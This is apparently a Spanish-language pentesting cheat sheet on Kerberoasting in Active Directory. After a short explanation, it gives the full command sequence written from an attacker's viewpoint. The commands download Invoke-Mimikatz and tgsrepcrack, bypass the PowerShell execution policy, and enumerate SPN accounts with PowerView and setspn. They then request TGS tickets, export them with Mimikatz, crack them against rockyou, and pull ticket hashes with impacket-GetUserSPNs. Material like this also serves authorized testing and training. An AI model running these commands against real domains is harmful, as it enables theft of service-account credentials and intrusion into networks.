# Kerberoasting 

Tags: #AD #Windows #Powershell #Kerberos 

Kerberoasting es una tecnica de post explotación que permite obtener un hash de una password de una cuenta de AD que tiene un 'Service Principal Name' (SPN). Un usuario autenticado del dominio solicita a Kerberos un ticket para un SPN. El ticket es encriptado con un hash de servicio afiliado a la password del usuario con el SPN. El atacante después offline craquea la password del hash con técnicas de fuerza bruta. Una vez obtenida la credencial en texto plano, el atacante puede ingresar al sistema, dispositivos o redes de la cuenta comprometida. 

```bash 
# Descargamos la utilidad en nuestra maquina de atacante para despues pasar el archivo a la maquina victima que esta utilizando PowerShell

❯ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
❯ wget https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py
```

```bash 
❯ powershell -ep bypass                      # Politica que nos permite ejecutar scripts en Powershell
 	# ep = Ejecutar politicas 

❯ . .\PowerView.ps1                          # Importamos el modulo
❯ Get-NetUser | Where-Object {$_.servicePrincipalName} | fl 
❯ setspn -T research -Q */*                  # Identificar las cuentas de usuario con SPN activado
	# fl = Format List

❯ klist # Lista los tickets de Kerberos de la sesion del usuario actual 
❯ Add-Type -AssemblyName System.IdentityModel 
# Solicitar a TGS ticket para el SPN usando Kerberos
❯ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/domain.local:1434"

❯ . .\Invoke-Mimikatz.ps1         # importamos el modulo 
❯ Invoke-Mimikatz -Command '"kerberos::list /export"'     # Listara todos los tickets de Kerberos y los exportara 
```

```bash 
# Craquear la password del TGS usando Tgrepcrack en Kali
❯ python3 tgsrepcrack.py /usr/share/wordlists/rockyou.txt 1-40a1-student@ops~local.kirbi 
	# TGS ticket File = 1-40a1-student@ops~local.kirbi
```

## Impacket-GetUserSPNs

```bash 
❯ impacket-GetUserSPNs domain.corp/user:Password     # Ver si el usuario es Kerberosteable y lista los usuarios a los que puedes solicitar un TGS

❯ impacket-GetUserSPNs domain1.corp/clearpass.user:Password@1 -dc-ip IP -request

	# dc-ip = Dirección IP del DC
	# domain1 = Dominio 
	# clearpass.user = Usuario valido del dominio 
	# Password@1 = Contraseña del usuario valido 

Nota: Debemos de tener la IP con su dominio en el '/etc/hosts'
```